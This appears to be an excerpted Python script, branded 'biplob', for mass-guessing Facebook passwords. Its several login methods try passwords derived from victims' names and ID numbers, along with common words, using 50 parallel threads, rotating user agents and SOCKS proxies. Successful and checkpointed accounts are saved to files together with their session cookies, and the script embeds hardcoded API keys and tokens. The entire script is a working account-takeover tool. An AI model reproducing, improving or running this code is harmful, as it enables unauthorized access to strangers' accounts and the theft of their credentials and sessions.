...
from concurrent.futures import ThreadPoolExecutor as biplobwork
from string import * 
...
def randBuildvsskj():
    ...
    return ua
sys.stdout.write('\x1b]2; biplob\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(50*'_')
        input("Press enter to back biplob Menu ")
        exit()
...
def x2():
  ...
  if word in data:
    ...
    os.system('pip install requests')
    print (' Run again : python biplob.py')
    exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.biplob-M1] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [biplob-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/biplob_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/biplob_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [biplob-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/biplob_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.biplob-M3] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [biplob-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/biplob_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/biplob_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [biplob-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.biplob-M2] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KINGb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KINGb};{ckkk}"
                    print(f"\r{A} [biplob-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/biplob_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/biplob_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{R} [biplob-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/biplob_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
    ...
    def methodF(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.biplob-M6] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [biplob-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/biplob_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def methodE(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.biplob-M5] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.biplob-M4] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def pasw(self):       
            ...
            print(50*'_')
            with biplobwork(max_workers=50) as KINGworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def rndm():
	...
	for nmbr in range(limit):
		...
		uid.append(nmp)
	with biplobwork(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		...
		for guru in uid:
			uid = kode+guru
			pwx = [uid,guru,guru[2:],kode+guru[:3],kode+guru[:4],guru[1:],'bangladesh','i love you','free fire','@#@#@#','islam123']
			if mthd =='1':
...
def ccrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMr.biplob-M3\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(cps))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[65:80]
				print('\033[1;92m[biplob-OK] '+cid+' | '+ps+'\033[1;32m')
				print(f' Number or Email : {uid}')
				print(f' Cookie : {coki}')
				open('biplob-VIP-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(uid)
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[82:97]
				print('\033[1;91m[biplob-CP] '+cid+' | '+ps+'\033[1;32m')
				open('biplob-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def bcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMr.biplob-RNDM>M2\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[82:97]
				print('\33[1;31m[biplob-CP] '+cid+' | '+ps+'\33[0;97m')
				open('biplob-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
...
def acrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMr.biplob-RNDM>M1\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen2)
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
